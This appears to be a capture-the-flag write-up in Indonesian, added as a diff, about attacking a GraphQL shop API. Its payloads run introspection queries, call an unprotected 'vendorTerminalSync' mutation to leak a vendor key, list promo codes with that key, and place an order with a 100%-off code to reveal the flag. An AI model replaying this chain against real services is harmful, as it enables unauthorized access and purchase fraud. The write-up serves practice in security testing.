@@ -1,0 +1,49 @@
+Cek field apa aja yang ada :
+{"query":"{ __schema { types{name}} }","variables":{}}
+
+
+Ngecek fungsi Query ada apa aja :
+{"query":"{ __type(name: \"Query\") {fields {name description args {name description type { name kind ofType { name kind}}}  }  }}","variables":{}}
+Ternyata dapat yang menarik, ada promoCodes, tapi dia harus ada vendorKey
+Cara nyari vendorKey gimana???
+
+Saat melakukan pembelian, dikirim data mutation "placeOrder" seperti ini :
+{"query":"mutation ($id: ID!, $promo: String) {\n  placeOrder(listingId: $id, promoCode: $promo) {\n    success message listingId pricePaid flag\n  }\n}","variables":{"id":"4042","promo":null}}
+Nah, disitu keliatan kalo ada kolom flag, Menarik....
+
+Coba kita liat ada tipe mutation apa aja :
+{"query":"{ __type(name: \"Mutation\") {fields {name description type {name kind ofType { name kind } } }}}","variables":{}}
+di mutation placeOrder dia akan mengembalikan tipe "Receipt", 
+selain itu, juga terlihat mutation dengan nama "vendorTerminalSync"
+
+Coba cek dulu tipe "Receipt"
+{"query":"{ __type(name: \"Receipt\") {fields {name description type {name kind ofType { name kind } } }}}","variables":{}}
+di dapat bahwa flag hanya akan muncul kalo saat kita beli barang, kita beli dengan harga 0
+
+Coba cek mutation vendorTerminalSync, ternyata dia butuh param dengan tipe "vendorTerminalSync"
+langsung saja cek tipe "vendorTerminalSync" seperti apa
+{"query":"{ __type(name: \"VendorDiagnostics\") {fields {name description type {name kind ofType { name kind } } }}}","variables":{}}
+
+Setelah tau tipe "vendorTerminalSync", langsung aja coba mutation dengan terminalId 1 :
+{"query":"mutation ($id: ID!) {\n  vendorTerminalSync(terminalId: $id) {\n    terminalId status  firmware vendorKey \n  }\n}","variables":{"id":"1"}}
+BAMM!! dapat vendorKey, 
+
+dengan vendorKey kita bisa dapat promoCodes, karena ingat disini :
+{"query":"{ __type(name: \"Query\") {fields {name description args {name description type { name kind ofType { name kind}}}  }  }}","variables":{}}
+vendorKey harus dikirim sebagai parameter,
+nah nantinya setelah vendorKey dikirim, dia akan me-return data bertipe "PromoCode" (tipe ini literally dapatnya nebak :p),
+langsung aja kita liat fieldnya apa2 aja disini :
+{"query":"{ __type(name: \"PromoCode\") {fields {name description type {name kind ofType { name kind ofType {name kind} } } }}}","variables":{}}
+
+Setelah tau field2 nya, langsung kita ambil PromoCodenya :
+{"query":"{ promoCodes(vendorKey: \"VND-MASTER-21d5f80206dffb6fa9ad5722\") { code description percentOff appliesTo  } }","variables":{}}
+terdapat banyak promoCode, tapi terdapat promo diskon 100%
+ya pasti kita ambil yang itu biar barang yang dibeli akan free
+
+kita kirim "code"nya di dalam field promo di mutation placeOrder seperti ini:
+{"query":"mutation ($id: ID!, $promo: String) {\n  placeOrder(listingId: $id, promoCode: $promo) {\n    success message listingId pricePaid flag\n  }\n}","variables":{"id":"1042","promo":"FOUNDERS-100"}}
+Disini dia ga dapat flagnya, tapi ketika diubah id productnya ke 4042 (barang dengan harga 1 juta) seperti ini :
+{"query":"mutation ($id: ID!, $promo: String) {\n  placeOrder(listingId: $id, promoCode: $promo) {\n    success message listingId pricePaid flag\n  }\n}","variables":{"id":"4042","promo":"FOUNDERS-100"}}
+kita akan dapatkan flagnya
+
+sun{1_l0v3_fr33_stuff}
